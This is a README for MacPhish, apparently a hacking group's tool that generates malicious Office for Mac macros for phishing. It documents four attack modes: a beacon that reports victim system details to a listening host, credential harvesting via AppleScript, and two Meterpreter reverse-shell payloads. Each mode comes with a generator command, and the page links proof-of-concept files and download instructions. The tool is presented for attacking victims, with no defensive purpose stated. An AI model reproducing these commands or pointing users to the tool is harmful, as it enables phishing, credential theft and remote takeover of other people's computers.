# [MacPhish](https://github.com/The404Hacking/MacPhish)
Office for Mac Macro Payload Generator

![macphish](macphish-alpha.png?raw=true "macphish")

## Attack vectors
There are 4 attack vectors available:
* beacon
* creds
* meterpreter
* meterpreter-grant

For the 'creds' method, macphish can generate the Applescript script directly, in case you need to run it from a shell. 

### beacon
On execution, this payload will signal our listening host and provide basic system information about the victim. The simplest way of generating a beacon payload is:
```
$./macphish.py -lh <listening host> 
```
By default, it uses curl but other utilities (wget, nslookup) can be used by modifying the command template. 

### creds
```
$./macphish.py -lh <listening host> -lp <listening port> -a creds
```
### meterpreter
The simplest way of generating a meterpreter payload is:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter 
```
### meterpreter-grant
The generate a meterpreter payload that calls GrantAccessToMultipleFiles() first:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter-grant
```

For meterpreter attacks, only python payloads are supported at the moment. 

## Usage
See [https://github.com/The404Hacking/MacPhish/wiki](https://github.com/The404Hacking/MacPhish/wiki)

## PoCs
* <https://drive.google.com/open?id=0BzPR8exG0kt6TlY1UWhiemVKRnc>
* <https://drive.google.com/open?id=0BzPR8exG0kt6WWUzU0tKUjFhdjg>
* <https://drive.google.com/open?id=0BzPR8exG0kt6VzlaWVVJdEtNR0k>
* <https://drive.google.com/open?id=0BzPR8exG0kt6SnJwM01KSzAzMjA>

## Download and Clone
> Download: [https://github.com/The404Hacking/MacPhish/archive/master.zip](https://github.com/The404Hacking/MacPhish/archive/master.zip)

> Clone: git clone [https://github.com/The404Hacking/MacPhish](https://github.com/The404Hacking/MacPhish.git)

## The404Hacking | Digital UnderGround Team
[The404Hacking](https://T.me/The404Hacking)

## Follow us !
[The404Hacking](https://T.me/The404Hacking) - [The404Cracking](https://T.me/The404Cracking)

[Instagram](https://instagram.com/The404Hacking) - [GitHub](https://github.com/The404Hacking)

[YouTube](http://yon.ir/youtube404) - [Aparat](http://www.aparat.com/The404Hacking)

[The404Hacking.BlogSky.Com](http://the404hacking.blogsky.com)
